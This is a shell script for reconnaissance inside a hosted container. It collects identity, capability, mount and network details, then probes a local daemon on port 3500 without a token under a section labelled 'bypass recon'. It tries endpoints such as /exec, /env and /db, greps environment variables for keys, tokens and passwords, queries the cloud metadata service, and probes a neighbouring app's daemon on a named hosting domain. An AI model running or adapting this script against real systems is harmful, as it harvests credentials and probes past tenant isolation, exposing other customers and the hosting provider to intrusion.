#!/bin/sh
OUT=/tmp/r.txt
{
echo "=== IDENTITY ==="
id; hostname; uname -a; whoami
echo "=== CONTAINER ==="
cat /proc/1/cgroup 2>/dev/null
cat /proc/self/status 2>/dev/null | grep -i cap
ls -la /.dockerenv 2>/dev/null
mount 2>/dev/null | head -30
echo "=== NETWORK (bypass recon) ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null
ip route 2>/dev/null
cat /etc/hosts
echo "=== :3500 SELF (localhost, no token) ==="
curl -sk --max-time 3 https://localhost:3500/ 2>&1 | head -20
curl -sk --max-time 3 http://localhost:3500/ 2>&1 | head -20
curl -sk --max-time 3 https://127.0.0.1:3500/stream 2>&1 | head -20
echo "=== :3500 DAEMON ENDPOINT MAP (self app_id via localhost) ==="
for p in / /health /status /db /query /exec /env /config /metrics /api /logs; do
  echo "--- $p ---"
  curl -sk --max-time 2 -o - -w " [%{http_code}]" https://localhost:3500$p 2>&1 | head -5
done
echo "=== ENV (secrets/orchestration) ==="
env | grep -iE 'key|token|secret|pass|db|host|aws|do_|cloud|api' 
echo "=== METADATA ==="
curl -s --max-time 3 http://169.254.169.254/metadata/v1/ 2>&1 | head -20
echo "=== NEIGHBOR PROBE (another app's daemon, MINE only) ==="
curl -sk --max-time 3 https://db-nodejs-1674776-6696107.cloudwaysnodeapps.com:3500/ 2>&1 | head -10
} > $OUT 2>&1
cat $OUT
